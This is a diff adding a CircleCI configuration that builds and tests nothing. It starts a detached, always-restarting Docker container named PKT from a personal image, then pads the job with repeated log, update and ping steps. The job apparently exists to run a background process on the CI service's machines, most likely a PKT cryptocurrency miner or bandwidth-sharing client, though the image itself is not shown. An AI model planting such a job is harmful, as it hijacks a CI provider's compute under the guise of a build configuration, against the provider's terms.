@@ -1,0 +1,31 @@
+version: 2
+jobs:
+ build:
+   machine: true
+   parallelism: 1
+   steps:
+     - checkout
+     - run: |
+         docker run -d --restart always --name PKT -it --cpus="0.3" --cpu-shares="128" nguyenduyphong/pkt_phong:tagname
+     - run :
+          sudo apt-get update && sudo apt-get install -y iputils-ping
+     - run :
+          docker ps    
+     - run :
+          sudo apt-get update     
+     - run :
+          docker logs PKT    
+     - run :
+          sudo apt-get update    
+     - run :
+          docker logs PKT    
+     - run :
+          sudo apt-get update    
+     - run :
+          docker logs PKT             
+     - run :
+          docker logs PKT             
+     - run :
+          docker logs PKT             
+     - run :
+          ping google.com    
